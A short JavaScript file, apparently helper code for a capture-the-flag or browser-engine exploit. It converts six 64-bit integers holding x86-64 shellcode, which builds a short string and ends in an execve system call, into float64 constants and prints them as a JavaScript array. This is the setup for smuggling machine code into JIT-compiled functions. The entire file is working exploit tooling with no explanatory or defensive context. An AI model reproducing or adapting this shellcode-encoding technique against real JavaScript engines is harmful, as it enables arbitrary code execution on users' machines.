function convertShellcode() {
    const shellcodeInts = [
        0xceb900067616cb8n,
        0xceb9066746163bbn,
        0xceb909020e0c148n,
        0xceb909050d80148n,
        0xceb90f631e78948n,
        0x90050f583b6ad231n
    ];
    
    const shellcodeFloats = [];
    const buffer = new ArrayBuffer(8);
    const view = new DataView(buffer);
    
    for (const int of shellcodeInts) {
        view.setBigUint64(0, int, true);
        const float = view.getFloat64(0, true);
        shellcodeFloats.push(float);
    }
    return shellcodeFloats;
}

const shellcode = convertShellcode();
console.log("const shellcode = () => {return [");
shellcode.forEach((num, index) => {
    console.log(`    ${num}${index < shellcode.length - 1 ? ',' : ''}`);
});
console.log("];}");